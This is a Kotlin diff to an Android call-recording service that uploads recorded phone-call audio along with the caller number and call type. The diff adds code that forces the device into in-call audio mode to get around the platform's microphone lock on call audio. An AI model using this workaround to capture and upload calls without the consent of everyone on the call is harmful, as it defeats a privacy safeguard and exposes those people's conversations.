@@ -6,6 +6,7 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.media.AudioManager
 import android.media.MediaRecorder
 import android.os.Build
 import android.os.IBinder
@@ -16,6 +17,8 @@ class AudioRecorderService : Service() {
 
     private var mediaRecorder: MediaRecorder? = null
     private var audioFile: File? = null
+    private var audioManager: AudioManager? = null
+    private var originalAudioMode: Int = AudioManager.MODE_NORMAL
 
     companion object {
         private const val CHANNEL_ID = "LMT_CALL_SYNC_CHANNEL"
@@ -24,6 +27,7 @@ class AudioRecorderService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
         createNotificationChannel()
         startForeground(NOTIF_ID, createNotification("Monitoring Phone Call Sync..."))
     }
@@ -37,9 +41,9 @@ class AudioRecorderService : Service() {
         val duration = intent.getIntExtra("duration", 0)
 
         when (action) {
-            "START" -> startMp3Recording()
+            "START" -> startRecording()
             "STOP" -> {
-                stopMp3Recording()
+                stopRecording()
                 uploadAudio(number, callType, duration)
             }
             "MISSED" -> {
@@ -49,50 +53,72 @@ class AudioRecorderService : Service() {
         return START_NOT_STICKY
     }
 
-    private fun startMp3Recording() {
-        val dir = File(externalCacheDir, "recordings")
-        if (!dir.exists()) dir.mkdirs()
+    private fun startRecording() {
+        try {
+            val dir = File(externalCacheDir, "recordings")
+            if (!dir.exists()) dir.mkdirs()
 
-        // Create standard MP3 format file
-        audioFile = File(dir, "rec_${System.currentTimeMillis()}.mp3")
+            // Standard MP3 extension for WhatsApp and VLC compatibility
+            audioFile = File(dir, "rec_${System.currentTimeMillis()}.mp3")
 
-        val audioSources = intArrayOf(
-            MediaRecorder.AudioSource.MIC,
-            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
-            MediaRecorder.AudioSource.VOICE_RECOGNITION,
-            MediaRecorder.AudioSource.CAMCORDER,
-            MediaRecorder.AudioSource.DEFAULT
-        )
-
-        for (source in audioSources) {
+            // Enable in-call audio routing in AudioManager to bypass hardware mic lock
             try {
-                mediaRecorder = MediaRecorder().apply {
-                    setAudioSource(source)
-                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                    setAudioSamplingRate(44100)
-                    setAudioEncodingBitRate(128000)
-                    setOutputFile(audioFile!!.absolutePath)
-                    prepare()
-                    start()
+                if (audioManager != null) {
+                    originalAudioMode = audioManager!!.mode
+                    audioManager!!.mode = AudioManager.MODE_IN_CALL
                 }
-                println("Successfully started MediaRecorder MP3 with source: $source")
-                break
             } catch (e: Exception) {
                 e.printStackTrace()
-                mediaRecorder?.release()
-                mediaRecorder = null
             }
+
+            val audioSources = intArrayOf(
+                MediaRecorder.AudioSource.VOICE_COMMUNICATION, // Dual-way VoIP / Call stream
+                MediaRecorder.AudioSource.MIC,
+                MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                MediaRecorder.AudioSource.CAMCORDER,
+                MediaRecorder.AudioSource.DEFAULT
+            )
+
+            for (source in audioSources) {
+                try {
+                    mediaRecorder = MediaRecorder().apply {
+                        setAudioSource(source)
+                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                        setAudioSamplingRate(44100)
+                        setAudioEncodingBitRate(128000)
+                        setOutputFile(audioFile!!.absolutePath)
+                        prepare()
+                        start()
+                    }
+                    println("Successfully started MediaRecorder with audio source: $source")
+                    break
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                    mediaRecorder?.release()
+                    mediaRecorder = null
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
     }
 
-    private fun stopMp3Recording() {
+    private fun stopRecording() {
         try {
             mediaRecorder?.stop()
             mediaRecorder?.release()
             mediaRecorder = null
         } catch (e: Exception) {
             e.printStackTrace()
+        } finally {
+            try {
+                if (audioManager != null) {
+                    audioManager!!.mode = originalAudioMode
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
         }
     }
 
